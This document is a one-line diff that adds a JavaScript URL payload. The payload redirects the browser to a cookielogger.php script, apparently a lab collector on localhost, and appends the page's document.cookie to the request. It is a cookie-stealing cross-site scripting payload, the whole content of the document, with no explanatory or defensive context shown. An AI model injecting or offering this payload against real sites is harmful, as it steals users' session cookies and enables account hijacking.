@@ -1,0 +1,1 @@
+javascript:document.location='http://localhost/cookies/cookielogger.php?ex='.concat(escape(document.cookie));
